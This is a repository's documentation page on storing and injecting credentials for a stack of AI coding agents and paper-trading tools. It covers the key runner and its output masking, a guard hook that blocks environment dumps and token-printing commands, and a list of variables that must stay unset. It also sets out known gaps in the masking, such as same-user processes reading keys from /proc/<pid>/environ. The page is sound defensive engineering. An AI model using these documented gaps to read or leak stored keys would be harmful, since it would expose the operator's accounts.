# Secret storage

How this stack keeps credentials on a host so that later sessions find them
without anyone retyping them, and so that nothing reaches GitHub. The decision
record, with the rejected alternatives and what would overturn it, is
[`decisions/2026-09-24-secret-storage.md`](decisions/2026-09-24-secret-storage.md).
The machine-readable list is
[`adoption/credential-inventory.json`](../adoption/credential-inventory.json).
[`scripts/credential_status.py`](../scripts/credential_status.py) checks a host
against it.

## The credentials this stack uses

| Inventory id | What it is | Status | Where it lives | Variable names |
| --- | --- | --- | --- | --- |
| `alpaca-paper` | Alpaca paper broker key pair | required now | `<store>/alpaca-paper.env` | `APCA_API_KEY_ID`, `APCA_API_SECRET_KEY` (optional, not secret: `APCA_API_BASE_URL`) |
| `alpaca-paper-2` | Alpaca paper broker key pair, second paper account (isolated incentive-monitor study) | optional | `<store>/alpaca-paper-2.env`, pointer `PAPER_ENV_FILE_2` | `APCA_API_KEY_ID`, `APCA_API_SECRET_KEY` (optional, not secret: `APCA_API_BASE_URL`) |
| `sec-contact` | SEC/EDGAR contact string. This is private personal data, not an auth secret | required now | `<store>/sec-contact.env` | `SEC_USER_AGENT` (optional private contact: `EDGAR_IDENTITY`; optional public cap: `EDGAR_RATE_LIMIT_PER_SEC`) |
| `databento` | Databento API key | only when you buy it | `<store>/databento.env` | `DATABENTO_API_KEY` |
| `typesafe` | Typesafe key, for the live-judge mode of `gap_crosswalk.py` and the native-skill-practice Jev provider in `blueprints/native-skill-practice/promptfooconfig.yaml`; start each through `tools/credentials/credential_run.py typesafe -- <command>`. A trading-lane use needs its own, separately authorized key | only when you pay for it | `<store>/typesafe.env` | `TYPESAFE_API_KEY` |
| `omniroute` | OmniRoute local gateway key, one per lane. The workstation gateway runs keyless on loopback, so callers pass the placeholder `local-loopback` ([decision](decisions/2026-09-27-omniroute-account-pool.md)) | optional | `<store>/omniroute.env` | `OMNIROUTE_API_KEY` |
| `tavily` | Tavily API key. Until 2026-09-29 it lived only in the kernel keyring; its first file write comes from that copy through the create-only chain in [Kernel keyring](#kernel-keyring-transport-and-per-boot-spare-2026-09-29) | optional | `<store>/tavily.env` | `TAVILY_API_KEY` |
| `grafana-admin` | Local Grafana admin account and secret key | generated locally | `~/.config/ecosystem-observability/ecosystem-grafana.env` | `GF_SECURITY_*` |
| `nativestack-generation-key` | Host service key | generated locally | `~/.config/nativestack/generation.key` | none |
| `openhands-session` | OpenHands agent-server session key for one runtime-worker attempt ([decision](decisions/2026-09-28-openhands-resolver-isolation.md)) | generated locally, per attempt; deleted after the attempt's containers are confirmed removed | `~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/<run-id>-<arm>.server.env`, plus the `.headers` file beside it | none on the host; `OH_SESSION_API_KEYS_0` exists only inside the agent-server container (Docker `--env-file`) |
| `claude-native`, `codex-native`, `gh-native` | Native sign-ins | stored by each tool | each tool's own store | none |
| `huggingface-native`, `huggingface-native-stored` | Hugging Face sign-in: the active token and every saved token | stored by `hf auth login`, one token per host ([Hugging Face sign-in](#hugging-face-sign-in)) | `$HF_HOME/token` and `$HF_HOME/stored_tokens`; `HF_HOME` defaults to `${XDG_CACHE_HOME:-$HOME/.cache}/huggingface` | none |
| `ibkr-gateway` | IB Gateway / TWS login | typed in at login, nothing stored | none | none |
| `github-actions` | `FOUNDATION_RESTORE_FIXTURE_20260920` and the per-job `github.token` | CI only | GitHub's encrypted secret store | none locally |

`<store>` means `${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack`.

`sec-contact` may also declare the public `EDGAR_RATE_LIMIT_PER_SEC` setting as
a positive integer, for example `5`, before launching an EdgarTools command.
The [template](examples/sec-contact.env.example) leaves this opt-in line commented;
unset keeps the vendor default of **9 requests per second**. The existing runner
passes the optional cap through unmasked while masking `SEC_USER_AGENT` and
`EDGAR_IDENTITY`. EdgarTools' default is separate from the SEC's current
[fair-access maximum of 10 requests per second](https://www.sec.gov/search-filings/edgar-search-assistance/accessing-edgar-data).
Source: EdgarTools 5.61.1,
[`edgar/httpclient.py:get_edgar_rate_limit_per_sec`](https://github.com/dgunning/edgartools/blob/7338aa335f6442c52dfa0695422cf1cd27e946e0/edgar/httpclient.py#L196-L202);
the 5.60.0 implementation is identical. This inventory declaration
does not set a host-wide or client-wide cap.

These should stay unset on the host, and child processes should never get
them: `GITHUB_TOKEN`, `GH_TOKEN`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
`CODEX_API_KEY`, `HF_TOKEN` and its legacy name `HUGGING_FACE_HUB_TOKEN`
(which `huggingface_hub` still reads), `QDRANT_API_KEY`, `MASSIVE_API_KEY`, the alias
names `ALPACA_API_KEY`/`ALPACA_SECRET_KEY`, `TWS_*`/`IBKR_ACCOUNT_ID`, and the
names that appear only in catalogs (`MISTRAL_`, `PREFECT_`, `MC_`, `MSB_`,
`PAPERCLIP_`, `OPENROUTER_API_KEY`). The checker lists any that are set, by
name only. `HF_TOKEN_PATH` holds a path, not a secret, but it stays unset
too: it moves the Hugging Face token files away from where the checker, the
guard and the deny rules look. The checker lists it by name under
`native store path overrides`.

<a id="using-a-key"></a>

## Using a key (available, 2026-09-29)

The key runner is available; adoption as the default remains a separate
decision. K4 (2026-09-30) makes the Claude Bash command guard inspect the
command the runner starts, including environment dumps and token-printing
forms. It refuses `credential_run.py tavily -- tvly auth` as
`native_token_print`; keep `--json` on `tvly auth`, which otherwise prints a
key's first eight and last four characters. The synthetic check that
accepted the runner form on 2026-09-29 is historical, before K4. Masking
still cannot catch arbitrary fragments or transformations of a key, and a
host gets K4 only after its frozen user-level copy is updated by the coordinator.

An agent, a Codex or OmniRoute lane, a workflow step or a unit may use a
stored key through one command that names only the inventory id:
`python3 tools/credentials/credential_run.py <inventory-id> -- <command> [args...]`.
For example:

```sh
python3 tools/credentials/credential_run.py tavily -- tvly search "<query>" --depth basic --json
python3 tools/credentials/credential_run.py alpaca-paper --check
```

[`tools/credentials/credential_run.py`](../tools/credentials/credential_run.py)
reads the entry's `0600` file and starts the command with that entry's
declared variables added to its environment. `--only NAME` narrows them. The
caller's own copies of every inventory variable, every `must_not_be_set` name
and every other entry's pointer variable (`PAPER_ENV_FILE`,
`SEC_CONTACT_ENV` and the like, each the path of a store file) are removed
first; the entry's own pointer variables stay. No value goes into the
command line, a temporary file or a shell. The command's stdout and stderr
are relayed with each injected value replaced by `[REDACTED:<NAME>]`, raw or
encoded: base64 and base64url at every byte alignment; percent-encoding as
`quote()` and `quote_plus()` write it (with `/` kept or escaped, a space as
`%20` or `+`, in both hex cases); JSON escaping as Python writes it, with `/`
written `\/` (PHP's `json_encode`) and with `<`, `>` and `&` written
`\u003c`, `\u003e` and `\u0026` (Go's `encoding/json`), or `\u003C`
and `\u003E` (the tag flag of PHP's `json_encode`); and hex. A variable that
the entry lists in `public_variables`, such as `APCA_API_BASE_URL`, is
injected unmasked. The command's exit code, stdin and non-UTF-8 bytes pass
through. The runner forwards `SIGINT`, `SIGTERM`, `SIGHUP`, `SIGQUIT`,
`SIGUSR1`, `SIGUSR2` and `SIGALRM` to the command's process group and no
other signal (`SIGKILL` and `SIGSTOP` cannot be forwarded). `--check` starts
nothing: it prints the names it would inject and the file state (`ok`,
`missing` or `unsafe`). No subcommand prints or returns a value.

The runner refuses the following, naming the id, a variable or a line
number but never a value or a path:
- an unknown id, or an id whose key an engine, a native client or CI holds;
- a missing file, a file whose mode is not exactly `0600`, a symbolic or
  hard link, a file over 64 KiB, or a store directory that is not a private
  `0700` directory outside every Git worktree;
- a line that is not `export NAME=value`, or a value outside the grammar of
  [`set_credential.py`](../tools/credentials/set_credential.py). A
  hand-edited `$`, backtick or backslash is refused, never expanded;
- a masked value shorter than 6 bytes, which could not be masked without
  masking ordinary output (a public variable is not masked, so it has no
  minimum);
- an inventory entry that declares a variable the dynamic loader or the
  interpreter reads at start-up (`LD_*`, `DYLD_*`, `PYTHON*`), reason
  `reserved_variable`, before any store is read;
- a host whose `/proc/sys/kernel/core_pattern` begins with `|` (a program,
  such as systemd-coredump or apport) or `@` (a core socket), reason
  `core_pattern_pipe` or `core_pattern_socket`. `RLIMIT_CORE` 0 stops a core
  file, but the kernel sets the limit aside for those two, and
  systemd-coredump then journals the crashing process's environment, which
  holds the key. There is no override. The message names that file, never
  what it holds. A file that cannot be read is refused too (reason
  `core_pattern_unreadable`); a host without the file, such as macOS, skips
  the check. A `RLIMIT_CORE` that cannot be set to 0 is refused as well
  (`core_limit_not_set`).

**Adding a key** takes one step from the user. The agent runs
`bash tools/credentials/open_credential_terminal.sh <inventory-id>`, and
the user types the key once at the hidden prompt in the window it opens
([Adding or rotating a key](#adding-or-rotating-a-key-without-pasting-it-anywhere)).
For a new provider, the agent first adds the inventory entry in its own
worktree, together with the matching `SECRET_NAMES` line in
`scripts/hooks/secret_path_guard.py` that `tests/test_secret_path_guard.py`
requires. It then opens the window from that worktree.

**Output and shutdown.** The runner writes to a pipe or socket without
blocking, through a queue of at most 256 KiB per stream. A consumer that
stops reading holds the command back, as in any pipeline, but not the
runner. After a shutdown signal (`SIGINT`, `SIGTERM`, `SIGHUP` or `SIGQUIT`,
which the runner forwards to the command's process group) it waits for no
consumer: what is queued is dropped, and the runner exits with the
command's status. Once the command has exited, the consumer has 2 seconds
to take what is queued, and the rest is dropped. Dropping is safe, because
only masked bytes are queued. A terminal, a regular file and `/dev/null`
are written directly, and a descriptor that shares its open file
description with the command's stdin is not made non-blocking, so an
interactive terminal stays blocking for the command. The limits of this
path are in the list below.

**The command's lifetime.** The command leads its own session and process
group. Once it has exited and its output is drained, and on every way out of
the runner, the runner sends what is left of that group `SIGTERM` and, after 2
seconds, `SIGKILL`, so no descendant that stayed in the group is left running
with the key in its environment. It does this while the command is still a
zombie, whose pid holds the group's number, so that a stranger cannot have been
given that number and hit by a late signal. Then it tells the watchdog to stand
down, and only then reaps the command. If the runner itself is killed without a
chance to do that (`SIGKILL`, the out-of-memory killer, `timeout -k`), the
command asks the kernel for `SIGTERM` (Linux `PR_SET_PDEATHSIG`, armed after
the runner's signal handlers have been put back to their defaults in the
forked command, so that nothing there swallows it), and a small watchdog
process, started with the command in its own session and with an empty
environment, ends the command's whole group the same way when the pipe it
shares with the runner closes. The limits are in the list below.

**What masking does not cover.** Masking guards against accidents; it is
not a boundary.
- Only the entry's injected variables are masked, and a value is masked
  only where a whole form of it appears unbroken in one stream (2026-09-29).
  Printed as they are: a fragment (plain `tvly auth` prints a key's first
  eight and last four characters); a reversed, encrypted or otherwise
  transformed value; a nested encoding (an encoding of an encoding); base64
  wrapped across lines; another escaper (Gson's `\u003d` for `=`, or a
  percent-encoding with a safe set other than `/` or none); a value split
  between stdout and stderr; a value broken by wrapping or by other bytes
  between its parts (`xxd` or `hexdump -C` columns, `fold`, wrapped table
  cells, colour codes, two writers on one stream); hex with separators; a
  value with a single quote that the shell requotes (`set -x`,
  `printf %q`); and anything the command writes to an inherited read-write
  stdin (a terminal or a pty), which never passes through the relay.
- Stdout and stderr are masked separately. What the command writes to a
  file, a log or the network never passes the masker.
- Output that ends, or a command that is killed, part-way through a value
  shows `[REDACTED-PARTIAL:<NAME>]` for the unfinished part once it is 4
  bytes or longer. Up to 3 bytes of the start of a value's form can be
  printed, after 100 ms without output or at the end. The masker holds back
  at most the longest form minus one byte, however long a run of repeated
  matches is, so such a run can come out as several markers.
- The value sits in the command's environment. While it runs, other
  processes of the same uid can read it through `/proc/<pid>/environ`, or
  with `ps -E` on macOS. So can a debugger of the same uid, and `ptrace`:
  they are out of scope, as is a core dump that a collector takes despite
  the limit on a host the runner does not refuse.
- K4's guard hook inspects the runner's started command in Claude's Bash
  tool. Codex, OmniRoute lanes and units do not automatically run this hook;
  they retain the runner's masking and its limits, without this guard layer.
- Output path, the non-blocking flag (2026-09-29). The runner sets it on the
  open file description of an inherited pipe or socket, and other writers
  on that description share it (`xargs -P` siblings, background jobs, a
  unit's other processes): they can see `EAGAIN` for the length of a run.
  With two runners on one pipe, the first to exit makes the pipe blocking
  under the second, and a runner killed with `SIGKILL` leaves the
  description non-blocking. The fix is planned for the hardening change
  before the default-path flip: `poll` and writes of at most `PIPE_BUF` for
  pipes, `send` with `MSG_DONTWAIT` for sockets, or a writer thread that can
  be abandoned, and never a flag flipped on an inherited description.
- Output path, the queue (2026-09-29). "A consumer that stops reading cannot
  hold the runner" holds only for the pipes and sockets the runner can make
  non-blocking. A terminal, a pty, a regular file, a descriptor that shares
  its description with stdin, and any sink that falls back to direct writes
  use blocking writes, and a consumer that stops reading can hold the
  runner there, past a shutdown signal.
- The command's lifetime (2026-09-29). A `SIGKILL` of the runner before its
  watchdog has started (a few milliseconds after the command's start) leaves
  only the parent-death signal, which reaches the command and not its
  children. If the runner dies after the command has exited but before it has
  stood the watchdog down, and init reaps the command before the watchdog
  acts, the group's number is nobody's for a moment: on a host with a small
  process-id space (macOS numbers stop at 99,999) it could in theory have
  been given to a stranger, whose group the watchdog would then signal. The
  watchdog reacts within milliseconds (about 1.3 ms, measured once on an
  idle host), which bounds that window. The runner
  itself never signals a group after it has reaped the command, but it can
  see the exit without reaping the command, and count the group's live
  members, only on Linux: macOS has no `/proc`, and its Python has no
  `os.waitid` before 3.13. Elsewhere the runner sees the exit by reaping the
  command and signals nothing after that, so a descendant of a command that
  has already exited is left running; only a failure inside the runner, while
  the command is unreaped, ends the group. A descendant that leaves the
  command's process group (`setsid`, `setpgid`, a double fork with `setsid`)
  is out of reach of the group kill and of the watchdog, and so is a
  set-user-ID command (the kernel clears the parent-death signal for such a
  binary, and its process cannot be signalled). Only Linux has been run: the
  watchdog has not been run on macOS. A same-user debugger or `ptrace` is out
  of scope.

**Units and other clients.**
- A systemd user unit may run its program through the runner:
  `ExecStart=/usr/bin/python3 -I <checkout>/tools/credentials/credential_run.py <inventory-id> -- <program>`.
  It reads the file at start, with no unlock and nothing in the manager's
  environment. Never pass a value through `Environment=`, `SetCredential=`,
  `systemctl --user set-environment` or `import-environment`.
  `EnvironmentFile=` stays only for the engines that already use it
  (Grafana, OmniRoute). The paper units keep their `--env-file` pointers
  until the trading lane decides otherwise.
- A launchd agent on macOS may do the same through `ProgramArguments`, with
  `EnvironmentVariables` holding `PATH` only
  ([macOS page](../adoption/platforms/macos-arm64.md#keys-under-launchd-drafted-2026-09-29-not-run-on-a-mac)).
- Never start Codex, or any other client, from a shell that exports a key:
  whatever the launcher exports can reach every command its model runs.
  The runner is how a key can reach those commands inside the command.
- An MCP stdio server that needs a key can be launched with the runner as
  its command, never with a `${VAR}` in its configuration.

## Storage rules

- Use one file per provider, under the store directory. The directory is mode
  `0700` and each file is `0600`, both owned by you. The store is outside every
  Git worktree, so a file in it cannot be committed.
- Each file holds `export NAME=value` lines. Quote a value that contains
  spaces, such as the SEC contact. Every parser in this repository accepts
  this form. `pit-availability/measure.py` accepts only this form.
- Repository code parses these files and never runs them as shell. The one
  exception is the catalyst-provenance recipe, which sources `sec-contact.env`
  with `set -a`. That is acceptable only because the file holds a contact
  string, not a credential.
- Never put a value in a shell rc file, a systemd unit, a launchd plist, a
  receipt, an issue, a chat, a gist or an agent prompt.
- Native sign-ins stay in each tool's own store and are never copied between
  hosts (`adoption/manifest.json` `authentication_transfer:
  native_login_on_target_only`).

## Adding or rotating a key without pasting it anywhere

Never paste a key into a chat, an issue, a prompt or a command line. Run:

```sh
tools/credentials/open_credential_terminal.sh <inventory-id>              # store or rotate a stored key
tools/credentials/open_credential_terminal.sh alpaca-paper --probe       # ...then probe the paper rate limit
```

The command opens a new terminal window: Windows Terminal on WSL2 (or a console window if Windows Terminal is missing), Terminal.app on macOS, or an X terminal on a Linux desktop. If it cannot open one, it prints the one command to run yourself. An agent may open the window, but it never sees what you type.

- **Before anything is typed**, the window prints the checkout's commit. It refuses if `tools/credentials/`, `scripts/credential_status.py` or `adoption/credential-inventory.json` has uncommitted changes, so you only ever type into committed code. It clears `PYTHONPATH`, `LD_PRELOAD` and similar variables, and runs Python with `-I`.
- **Stored keys:** `tools/credentials/set_credential.py <inventory-id>` accepts only operator-supplied entries (required, optional or paid) whose file sits directly in the store. It asks for each variable with hidden input, and refuses if the terminal cannot hide input. It writes `export NAME=value` lines atomically: a `0600` file in the `0700` store, outside Git, written through a directory handle opened without following symlinks. To replace an existing file you type `replace`, also hidden. Its one form without a terminal, `--from-env`, is create-only and exists for a key that already lives in the kernel keyring ([Kernel keyring](#kernel-keyring-transport-and-per-boot-spare-2026-09-29)).
- **Paper rate limit:** `tools/credentials/alpaca_rate_limit_probe.py` sends one read-only `GET /v2/account` to the fixed paper host. It follows no redirect, reads no response body and places no order. It saves only the HTTP status and the `x-ratelimit-*` headers, under `${XDG_STATE_HOME:-$HOME/.local/state}/native-agent-stack/rate-limit/`, where a later session can read them. `x-ratelimit-limit` is Alpaca's own per-account calls-per-minute figure (200 on the standard tier), so measuring it never needs order traffic. Agents may run it with `--env-file "$PAPER_ENV_FILE"`.

Live broker keys are out of scope for this repository. Live trading is handled outside it, and no tool here accepts a live endpoint.

## Picking up in a new session

Put the file paths, never the values, in your shell startup file once:

```sh
# ~/.bashrc or ~/.zshrc: pointers only; no credential value is exported
_nas_store="${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack"
export PAPER_ENV_FILE="$_nas_store/alpaca-paper.env"
export PAPER_ENV_FILE_2="$_nas_store/alpaca-paper-2.env"   # second paper account, where this host holds one
export SEC_CONTACT_ENV="$_nas_store/sec-contact.env"
export PIT_ALPACA_ENV_PATH="$PAPER_ENV_FILE" PIT_SEC_ENV_PATH="$SEC_CONTACT_ENV"
unset _nas_store
```

Every later session, whether yours or an agent's, then uses the existing
recipes unchanged. For example:
`python3 runner.py preflight --env-file "$PAPER_ENV_FILE" ...`. Commands pass a
pointer and never spell out the store path, so the guard hook can block any
command that does spell it out.

Five consumers still read the Alpaca pair only from environment variables:
`alpaca-paper/paper_runner.py`, `alpaca-historical/collect.py`,
`security-identity/probe.py`, `security-identity/quality.py` and
`delisting-coverage/collect.py`. This is item A1 in
[`decisions/2026-09-24-community-sweep.md`](decisions/2026-09-24-community-sweep.md).
Until they are moved to `--env-file`, run them one invocation at a time in a
subshell, so that the values exist only in that child's environment:

```sh
( set -a; . "$PAPER_ENV_FILE"; set +a; exec python3 blueprints/us-equities/alpaca-paper/paper_runner.py ... )
```

The key runner ([Using a key](#using-a-key-available-2026-09-29)) is an
available alternative that puts the pair into that one command's
environment and masks it in the command's output. It remains available,
with adoption as the default pending a separate decision:

```sh
python3 tools/credentials/credential_run.py alpaca-paper -- python3 blueprints/us-equities/alpaca-paper/paper_runner.py ...
```

While either child runs, any process running under your uid can read its
environment through `/proc/<pid>/environ` or `ps e`. Prefer the `--env-file`
consumers.

## Setting up a new host (WSL2 or macOS)

Values never go through an agent, a chat, a gist, GitHub or shell history.

1. Clone, then run `python3 scripts/adoption_status.py` and
   `python3 scripts/credential_status.py`. Both only inspect the host and change
   nothing.
2. Sign in natively yourself: run `claude`, `codex login --device-auth`,
   `gh auth login` and then `gh auth setup-git`. On a host that downloads
   gated models, also run `hf auth login` as described in
   [Hugging Face sign-in](#hugging-face-sign-in). Start IB Gateway/TWS
   interactively if you use IBKR.
3. Create the store and one file per provider you need. Start each file from
   its template. `install` sets the mode as it creates the file, and it works
   the same way with GNU and BSD `install` because the source is a regular file:
   ```sh
   d="${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack"
   install -d -m 700 "$d"
   install -m 600 docs/examples/alpaca-paper.env.example "$d/alpaca-paper.env"
   install -m 600 docs/examples/sec-contact.env.example "$d/sec-contact.env"
   ```
   Fill the values in a local editor. Never use `echo KEY=... >`.
   Where you can, issue a new key for each host at the provider, so that one
   host can be revoked without affecting the others. Alpaca paper allows only
   one pair per account, so move that file through your own private channel,
   such as your password manager or an `age`-encrypted file sent out of band.
4. Add the pointer lines from the previous section to your shell startup file.
5. Install the scanner before you enable the hook. The tracked
   [`scripts/git-hooks/pre-commit`](../scripts/git-hooks/pre-commit) runs
   whatever `gitleaks` resolves on `PATH`. Enabled first, it refuses every
   commit while gitleaks is missing, and it scans with no memory, task or time
   cap while the raw binary comes first on `PATH`. Unbounded gitleaks scans
   caused the 2026-09-24 memory kills recorded in
   [`next-host-stages.md`](next-host-stages.md).

   **5a. Install and verify gitleaks 8.30.1 and the guarded launcher.** On
   Linux/WSL2, check the pinned release archive against the release's checksum
   file (both pinned in
   [`wsl-native-tools/pins.json`](../blueprints/convergence-practice/wsl-native-tools/pins.json))
   and extract the binary into `$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/`,
   the directory `gitleaks-guarded` runs it from:
   ```sh
   ECO_INSTALL_ROOT="${ECO_INSTALL_ROOT:-$HOME/.local/share/codex-ecosystem}"
   base=https://github.com/gitleaks/gitleaks/releases/download/v8.30.1
   curl -fsSLO "$base/gitleaks_8.30.1_linux_x64.tar.gz"
   curl -fsSLO "$base/gitleaks_8.30.1_checksums.txt"
   sha256sum --check --ignore-missing gitleaks_8.30.1_checksums.txt   # gitleaks_8.30.1_linux_x64.tar.gz: OK
   mkdir -p "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1"
   tar -xzf gitleaks_8.30.1_linux_x64.tar.gz -C "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1" gitleaks
   ```
   Then install `ecosystem-bounded-run`, `gitleaks-guarded` and the `gitleaks`
   link beside them as in
   [`adoption/tools/README.md`](../adoption/tools/README.md#install-on-a-new-linuxwsl2-host).
   `gitleaks-guarded` runs `$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/gitleaks`
   unless `GITLEAKS_NATIVE` names another path. An existing install that
   unpacked the binary to `tools/gitleaks-8.30.1/payload/gitleaks` needs either
   `GITLEAKS_NATIVE` or the relative link below. The link needs no environment
   change, so sessions that are already running use it too:
   ```sh
   # Only for the payload/ layout:
   ln -s payload/gitleaks "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/gitleaks"
   # Then, for every layout:
   command -v gitleaks                 # $ECO_INSTALL_ROOT/bin/gitleaks
   readlink "$(command -v gitleaks)"   # $ECO_INSTALL_ROOT/bin/gitleaks-guarded
   gitleaks version                    # 8.30.1; `version` execs the native binary and starts no scan
   ```
   On macOS the bounded front end is `gitleaks-guarded-macos`, and `gitleaks`
   must resolve to it: install the front end with a `gitleaks` link to it in a
   directory that comes before every directory holding the native binary on
   `PATH`, as in the macOS install steps of
   [`adoption/tools/README.md`](../adoption/tools/README.md#macos-gitleaks-guarded-macos-2026-09-24).
   The front end never looks `gitleaks` up on `PATH`. It runs
   `GITLEAKS_NATIVE` or the mise install path
   (`${MISE_DATA_DIR:-$HOME/.local/share/mise}/installs/gitleaks/8.30.1/gitleaks`,
   where the measured Mac's mise install of 8.30.1 put it), and refuses with
   exit 78 when that binary is missing or resolves to the front end itself
   ([`gitleaks-guarded-macos`](../adoption/tools/gitleaks-guarded-macos),
   lines 214-220), so the link cannot loop. It passes when `command -v gitleaks`
   is the link, `readlink "$(command -v gitleaks)"` names
   `gitleaks-guarded-macos`, and `gitleaks version` prints `8.30.1`. If
   `gitleaks` resolves to the native binary instead, every hook scan is
   unbounded.

   **5b. Enable the hook** in each clone, which replaces `.git/hooks` for that
   clone:
   ```sh
   git config core.hooksPath scripts/git-hooks
   git config --get core.hooksPath   # scripts/git-hooks: relative, so each worktree runs its own checkout's hook
   ```
   Then check the hook from a worktree with a staged file, once with clean
   content and once with a planted key (`git hook run` needs Git 2.36 or
   later). A throwaway worktree keeps both files out of your own index. The
   planted value is generated and inert, never a real key:
   ```sh
   t=$(mktemp -d) && git worktree add -q --detach "$t/w" && cd "$t/w"
   printf 'hook check\n' > clean.txt && git add clean.txt
   git hook run pre-commit; echo "exit=$?"   # "no leaks found", exit=0
   printf 'aws_access_key_id = AKIA%s\n' "$(LC_ALL=C tr -dc 'A-Z2-7' </dev/urandom | head -c 16)" > planted.txt
   git add planted.txt
   git hook run pre-commit; echo "exit=$?"   # "leaks found: 1", exit=1
   cd - >/dev/null && git worktree remove --force "$t/w" && rm -r "$t"
   ```
   Both results are needed: with nothing staged the hook also exits 0, so a
   clean pass alone does not show that the scan can find anything. The hook
   was added after `v2026.09.24.1`. In a checkout of that tag,
   `git hook run pre-commit` fails with `cannot find a hook named pre-commit`,
   and `git commit` runs no hook at all.

   **5c. The same setting enables the pre-push registry gate.** The tracked
   [`scripts/git-hooks/pre-push`](../scripts/git-hooks/pre-push) checks out
   the tip commit of each pushed ref into a detached worktree under `$TMPDIR`
   and runs the three registry tests that failed CI's `validate` job on six
   pull requests on 2026-09-27:
   `tests.test_osv_lockfile_coverage.LockfileInventoryTests.test_every_tracked_lockfile_and_manifest_is_listed`,
   `tests.test_blind_checkout.RepositoryClassificationTests.test_every_blueprint_value_under_a_label_key_is_classified`
   and
   `tests.test_workflow_security_coverage.NewWorkflowSecurityCoverageTests.test_all_published_workflows_are_listed_and_covered`.
   Like CI, which tests one commit per pull request, it does not test the
   commits between a ref's old and new tip.
   - **Refused:** a failure, a skip or an expected failure. So is a tip that
     lacks the three tests: an old tag, a `backup/*` branch, or an unrelated
     history such as a notes ref or an orphan branch. Push those with
     `git push --no-verify`, the explicit, visible override.
   - **Not tested:** a branch deletion, which needs neither zizmor nor Python.
   - **Prerequisites:** install the pinned zizmor 1.30.1 first
     ([`ci-security`](../blueprints/convergence-practice/ci-security/README.md):
     `uv tool install zizmor==1.30.1`). The workflow-coverage class skips
     without it, so the hook refuses every push that has a commit to test
     while `zizmor` is missing from `PATH`. The first `python3` on `PATH` must
     be 3.11 or later (`tomllib`). The macOS system `/usr/bin/python3` is 3.9
     (3.9.6 on CI's `macos-15` runner); with it, the `tomllib` import fails
     and the push is refused.
   - **Scratch location:** the hook refuses when git's own discovery finds a
     repository above `$TMPDIR`. An empty `.git` directory, such as the mount
     point a sandbox can leave in `/tmp`, is not a repository to git, so it
     is not refused. `$TMPDIR` defaults to `/var/tmp`, because the checkout is
     about 140 MB, and file-hierarchy(7) keeps `/tmp`, usually a tmpfs, for
     small files.
   - **Cleanup:** the hook removes its worktree when it exits and when it
     gets HUP, INT, QUIT, PIPE or TERM. A signal it cannot or does not trap,
     such as SIGKILL, can leave a `pre-push.*` directory behind; delete that
     directory, then run `git worktree prune`.

   Measured on WSL2 on 2026-09-27: 1.5 to 1.8 s for a push of one commit,
   most of it the checkout. Check it without pushing:
   ```sh
   zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
   printf 'refs/heads/x %s refs/heads/x %s\n' "$(git rev-parse HEAD)" "$zero" |
     scripts/git-hooks/pre-push origin origin; echo "exit=$?"   # "Ran 3 tests", "OK", exit=0
   ```
6. Install the user-level guards with the Claude profile tools
   ([`adoption/bootstrap.md`](../adoption/bootstrap.md) step 4a):
   `python3 tools/adoption/install_claude_profile.py --only guard`, then render
   and apply the settings template. For Codex, add the snippet in
   [User-level guards](#user-level-guards-deployed-by-the-claude-profile) by hand.
7. Run `python3 scripts/credential_status.py` again until every required entry
   reports `ok`.
8. Run the fail-closed check with a synthetic file, never a copy of the real
   one:
   ```sh
   t=$(mktemp -d); printf 'export APCA_API_KEY_ID=fake\nexport APCA_API_SECRET_KEY=fake\n' > "$t/p.env"
   chmod 644 "$t/p.env"
   python3 blueprints/us-equities/adaptive-paper/runner.py preflight --env-file "$t/p.env" --output "$t/o.json"
   echo "exit=$?"; cat "$t/o.json"   # expect exit=3, "error_type": "SafetyError", no value anywhere
   rm -rf "$t"
   ```
   Measured on WSL2 on 2026-09-24: exit 3, and the output file held only
   `status`, `error_type` and `reconciliation`.
   Past receipts do not certify a new host.
9. Services and timers (systemd user units on WSL, launchd agents on macOS)
   pass `--env-file` with the conventional path, for example
   `%h/.config/native-agent-stack/alpaca-paper.env` in `ExecStart=`. Do not
   use `EnvironmentFile=`: it puts the values into
   `/proc/<pid>/environ`. No secret is written into the unit or plist.
   Model-serving units need no Hugging Face token at all: they serve from a
   pinned local directory, and new units set `Environment=HF_HUB_OFFLINE=1`
   (see [Hugging Face sign-in](#hugging-face-sign-in) for llama.cpp, which
   does not read it).

## Hugging Face sign-in

Gated model repositories need an authenticated download. Access to a gated
model is requested in the browser, on the model's page, and downloads then
need a token of an account that was granted access
([gated models](https://huggingface.co/docs/hub/models-gated)). Each host that
downloads gated models signs in natively, once. Agents then use that sign-in
through `hf`, which reads the token itself, so the value never enters an
agent's context.

**Where the token lives.** `hf auth login` writes the active token to
`$HF_HOME/token` and every saved token, by name, to `$HF_HOME/stored_tokens`.
It creates both files with mode `0600` and sets their directory to `0700`.
`HF_HOME` defaults to `~/.cache/huggingface`, or to
`$XDG_CACHE_HOME/huggingface` when `XDG_CACHE_HOME` is set, and
`HF_TOKEN_PATH` overrides the active token's path
([environment variables](https://huggingface.co/docs/huggingface_hub/package_reference/environment_variables)).
The inventory rows `huggingface-native` and `huggingface-native-stored` use
the same default, so `scripts/credential_status.py` checks the files `hf`
uses. These facts were checked on 2026-09-25 against the installed
`huggingface_hub` 1.32.0 source (`constants.py`, `utils/_auth.py`, `utils/_headers.py`,
`_login.py`, `cli/auth.py`) and the same files at the upstream `v2.0.0` tag.

- Nothing goes in your shell startup file for Hugging Face. Never export
  `HF_TOKEN` or `HUGGING_FACE_HUB_TOKEN`: either one takes precedence over the
  stored token and reaches every child process.
- Leave `HF_TOKEN_PATH` unset. It moves both files. The checker and the deny
  rules do not follow it, and the guard catches only a reader, copy or input
  redirect that spells `$HF_TOKEN_PATH`, not the path it holds.
- Put model files elsewhere with `--local-dir` or `HF_HUB_CACHE`, not by
  pointing `HF_HOME` somewhere else. A process with another `HF_HOME` does not
  see the sign-in.

**One token per host, least privilege.** At
<https://huggingface.co/settings/tokens>, create a **fine-grained** token for
this host alone, with only the repository permission *Read access to contents
of all public gated repositories you can access*. Hugging Face recommends one
